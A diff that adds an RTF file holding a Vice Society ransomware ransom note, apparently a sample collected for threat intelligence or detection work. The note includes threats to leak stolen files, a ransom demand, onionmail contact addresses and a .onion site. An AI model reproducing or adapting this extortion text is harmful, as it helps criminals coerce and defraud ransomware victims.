@@ -1,0 +1,42 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2761
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
+{\colortbl;\red255\green255\blue255;}
+{\*\expandedcolortbl;;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\f0\fs24 \cf0 ALL YOUR FILES HAVE BEEN ENCRYPTED BY VICE SOCIETY\
+\
+All your important documents, photos, databases were stolen and encrypted.\
+\
+If you do not contact us in 7 days we will upload your files to darknet!\
+\
+The only method of recovering files is to purchase an unique private key.\
+\
+\
+\
+We are the only who can give you tool to recover your files.\
+\
+To proove that we have the key and it works you can send us 2 files and we decrypt it for free (not more than 2 MB each).\
+\
+This file should be not valuable!\
+\
+Write to email: CoryFrempton@onionmail\\.org\
+\
+Alternative email: DanyTron@onionmail\\.org\
+\
+v-society.official@onionmail\\.org\
+\
+Attention!\
+\
+Do not rename encrypted files.\
+\
+Do not try to decrypt your data using third party software, it may cause permanent data loss.\
+\
+Decryption of your files with the help of third parties may cause increased price (they add their fee to ours) or you can become a victim of a scam.\
+\
+Visit our website 4hzyuotli6maqa4u\\.onion \
+\
+Use tor browser to open\
+\
+                    }
